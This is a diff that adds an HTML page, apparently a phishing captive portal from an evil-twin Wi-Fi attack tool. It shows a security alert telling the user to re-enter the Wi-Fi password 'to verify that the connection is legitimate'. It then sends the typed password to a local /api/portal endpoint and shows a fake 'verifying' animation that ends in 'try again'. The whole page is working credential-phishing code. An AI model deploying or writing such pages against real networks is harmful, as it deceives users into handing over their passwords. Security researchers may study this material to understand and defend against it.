@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/main.css">
+    <link rel="preload" href="./font/sarabun.woff2" as="font" type="font/woff2" crossorigin="anonymous"/>
+    <title>Wifi</title>
+    <style>
+        @font-face {
+            font-family: "Sarabun";
+            src: local("Sarabun Regular"), local("Sarabun-Regular"), url("./font/sarabun.woff2") format("woff2");
+            font-weight: normal;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        * {
+            font-family: "Sarabun", sans-serif;
+            box-sizing: border-box;
+        }
+    </style>
+</head>
+<body>
+<main>
+    <img src="./img/alert.svg" alt="alert">
+    <h1>You are required to re-enter the password to verify that the connection is legitimate.</h1>
+    <form>
+        <input type="password" id="password" name="password" placeholder="password" required pattern="^.{8,255}$"/>
+        <input onclick="sendPassword(); return false;" type="submit" id="submit" value="continue">
+    </form>
+</main>
+<script type="text/javascript">
+    async function sendPassword() {
+        let password = document.getElementById("password")
+
+        if (!password.checkValidity()) {
+            alert("invalid password")
+        } else {
+            loading().then()
+            await fetch("/api/portal?password=" + encodeURIComponent(password.value.toString()), {
+                credentials: "include",
+            })
+        }
+    }
+
+    async function loading() {
+        let submit = document.getElementById("submit")
+        submit.disabled = true
+        for (let i = 0; i < 100; i++) {
+            submit.value = ("verifying" + Array.from(new Array((i % 4)+1), () => ".").join("")).replace(".", "")
+            await new Promise(r => setTimeout(r, 300))
+        }
+        submit.disabled = false
+        submit.value = "try again"
+    }
+</script>
+</body>
+</html>
